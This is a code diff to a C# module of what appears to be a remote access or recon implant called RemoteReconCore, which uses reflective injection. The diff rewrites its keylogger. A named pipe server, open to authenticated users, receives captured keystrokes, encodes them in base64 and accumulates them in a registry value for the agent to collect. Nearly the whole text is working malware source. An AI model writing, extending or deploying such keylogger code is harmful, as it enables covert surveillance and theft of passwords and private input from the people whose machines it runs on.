@@ -5,6 +5,8 @@ using System.IO;
 using System.Text;
 using System.Threading;
 using ReflectiveInjector;
+using System.Windows.Forms;
+using System.Security.Principal;
 
 namespace RemoteReconCore
 {
@@ -30,52 +32,68 @@ namespace RemoteReconCore
 #endif
                 Thread t = new Thread(() =>
                 {
-                    WriteKeyStrokes();
+                    ReceiveKeyStrokes();
                 });
-                t.SetApartmentState(ApartmentState.STA);
                 t.IsBackground = true;
                 t.Start();
 #if DEBUG
                 Console.WriteLine("Started background thread to sync keylogger");
 #endif
-                return new KeyValuePair<int, string>(0, "Keylogger successfully started");
+                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylogger successfully started"));
+                return new KeyValuePair<int, string>(0, msg);
             }
             
         }
 
-        private static void WriteKeyStrokes()
+        private static void ReceiveKeyStrokes()
         {
-            Thread.Sleep(Agent.sleep * 1000);
-
-            NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_kl", PipeDirection.InOut);
-            client.Connect(Agent.sleep * 1000);
+            string enc = "";
+            PipeSecurity ps = new PipeSecurity();
+            ps.SetAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow));
+            NamedPipeServerStream server = new NamedPipeServerStream("svc_kl", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
+            server.SetAccessControl(ps);
+            server.WaitForConnection();
 #if DEBUG
-            Console.WriteLine("Connected to namedpipe server");
+            Console.WriteLine("Received connection from client");
             Console.WriteLine("Starting loop");
 #endif
-            while(client.IsConnected)
+            StreamReader sr = new StreamReader(server);
+            while(server.IsConnected)
             {
+                string oldVal = " ";
+                oldVal = Encoding.ASCII.GetString(Convert.FromBase64String((string)Agent.rrbase.GetValue(Agent.kkey)));
                 
-                string oldVal = Encoding.Unicode.GetString(Convert.FromBase64String((string)Agent.rrbase.GetValue(Agent.kkey)));
-                byte[] msg = new byte[1024];
-                client.ReadMode = PipeTransmissionMode.Byte;
-                client.Read(msg, 0, msg.Length);
-                string newVal = Encoding.Unicode.GetString(msg);
-                oldVal = oldVal + newVal;
-#if DEBUG 
-                Console.Write(oldVal);
+                try
+                {
+                    string ks = sr.ReadLine();
+                    ks = ks.TrimEnd(new char[] { '\0','\r','\n'});
+                    oldVal = oldVal + ks;
+                    enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(oldVal));
+#if DEBUG
+                    Console.Write(oldVal);
 #endif
-                Agent.rrbase.SetValue(Agent.kkey, oldVal);
+                    
+                }
+                catch (Exception e)
+                {
+                    enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
+#if DEBUG
+                    Console.WriteLine("Error: \n" + e.ToString());
+#endif
+                }
 
-                client.Connect(Agent.sleep * 1000);
+                Agent.rrbase.SetValue(Agent.kkey, enc);
+                Thread.Sleep(Agent.sleep * 1000);
             }
 
 #if DEBUG
             Console.WriteLine("Client disconnected");
 #endif
-            client.Close();
-            client.Dispose();
+            sr.Close();
+            server.Close();
+            server.Dispose();
             
         }
+
     }
 }
